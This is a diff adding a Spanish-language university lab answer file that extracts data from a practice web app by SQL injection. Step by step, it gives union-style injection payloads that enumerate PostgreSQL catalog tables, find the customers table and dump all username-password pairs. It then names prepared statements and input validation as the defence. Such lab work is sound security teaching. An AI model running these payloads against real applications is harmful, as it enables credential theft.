@@ -1,0 +1,37 @@
+2000'; SELECT relname as movietitle FROM pg_class;--
+
+Con eso sacamos todas las tablas (apartado b)
+
+2000'; SELECT concat(oid, nspname) as movietitle FROM pg_namespace;--
+
+Con eso sacamos el oid de public (2200)
+
+2000'; SELECT relname as movietitle FROM pg_class where relnamespace = 2200;--
+
+Con eso sacamos las tablas del esquema public (apartado c)
+
+Podemos ver que existe una tabla llamada customers (apartado d)
+
+2000'; SELECT oid as movietitle FROM pg_class where relnamespace = 2200 and relname = 'customers';--
+
+El oid de dicha tabla es 18006 (apartado e)
+
+2000'; SELECT attname as movietitle FROM pg_attribute where attrelid=18006;--
+
+Obtenemos las columnas (apartado f)
+
+Hay una columna llamada username (apartado g)
+
+2000'; SELECT username as movietitle FROM customers;--
+
+Tenemos todos los usuarios (apartado h)
+
+Con:
+
+2000'; SELECT concat(username, '|', password) as movietitle FROM customers;--
+
+Tenemos no solo sus nombres, sino la pareja nombre-password, de todos ellos.
+
+Para protegerse de este ataque no valen ninguna de las alternativas que se proponen en el pdf de la práctica.
+En caso de utilizar un combobox, el atacante puede introducir la cadena con la inyección en los argumentos de la página, independientemente de lo que haya introducido en el combobox. En caso de usar POST el problema sigue siendo el mismo, el atacante puede modificar los argumentos antes de realizar la petición y conseguir la misma información.
+Las formas de protegerse son las mismas que en el apartado anterior, consultas preparadas y vaĺidación de argumentos.
